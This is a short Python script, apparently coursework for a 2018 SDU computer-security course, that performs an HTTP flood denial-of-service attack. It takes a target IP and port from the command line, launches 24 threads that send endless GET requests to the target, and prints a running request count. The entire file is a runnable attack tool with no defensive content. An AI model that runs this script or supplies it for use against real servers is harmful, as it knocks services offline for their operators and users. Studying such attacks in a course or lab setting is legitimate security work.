#! /usr/bin/env python

# Security in Computer Systems 2018 - SDU.
# HTTP Flood Attack.
# @CarlosViescasHuerta.


import sys
import threading
import requests
import time

dst_ip = sys.argv[1]
dst_port = int(sys.argv[2])
#_ord = '/orders'
_url = 'http://' + dst_ip + ':' + str(dst_port)

# Counter
i = 0

def DoSHTTP(_url): 
    global i

    while True:
        i = i + 1    
        # Send GET requests.
        resp = requests.get(_url)
        if resp.status_code != 200:
            print ('GET API error ' + str(resp.status_code))
        else:
            print("Flooding server in " + dst_ip + " with #" + str(i) + " requests.")
            
# Define threads
def _threads_():

    a = threading.Thread(target=DoSHTTP, args=[_url])
    b = threading.Thread(target=DoSHTTP, args=[_url])
    c = threading.Thread(target=DoSHTTP, args=[_url])
    d = threading.Thread(target=DoSHTTP, args=[_url])
    e = threading.Thread(target=DoSHTTP, args=[_url])
    f = threading.Thread(target=DoSHTTP, args=[_url])
    g = threading.Thread(target=DoSHTTP, args=[_url])
    h = threading.Thread(target=DoSHTTP, args=[_url])
    j = threading.Thread(target=DoSHTTP, args=[_url])
    k = threading.Thread(target=DoSHTTP, args=[_url])
    l = threading.Thread(target=DoSHTTP, args=[_url])
    m = threading.Thread(target=DoSHTTP, args=[_url])
    n = threading.Thread(target=DoSHTTP, args=[_url])
    o = threading.Thread(target=DoSHTTP, args=[_url])
    p = threading.Thread(target=DoSHTTP, args=[_url])
    q = threading.Thread(target=DoSHTTP, args=[_url])
    r = threading.Thread(target=DoSHTTP, args=[_url])
    s = threading.Thread(target=DoSHTTP, args=[_url])
    t = threading.Thread(target=DoSHTTP, args=[_url])
    u = threading.Thread(target=DoSHTTP, args=[_url])
    v = threading.Thread(target=DoSHTTP, args=[_url])
    x = threading.Thread(target=DoSHTTP, args=[_url])
    y = threading.Thread(target=DoSHTTP, args=[_url])
    z = threading.Thread(target=DoSHTTP, args=[_url])

    a.start()
    b.start()
    c.start()
    d.start()
    e.start()
    f.start()
    g.start()
    h.start()
    j.start()
    k.start()
    l.start()
    m.start()
    n.start()
    o.start()
    p.start()
    q.start()
    r.start()
    s.start()
    t.start()
    u.start()
    v.start()
    x.start()
    y.start()
    z.start()

def main():

    print("***** Starting HTTP Flood DoS attack ******")
    time.sleep(1.5)
    
    try:
        _threads_()

    except KeyboardInterrupt:
        
        print ("\n \n \n \n \n \n \n \n \n \n \n")
        print ("HTTP Flood interrupted. Total requests sent: " + str(i))


# Run attack
main()

# EOF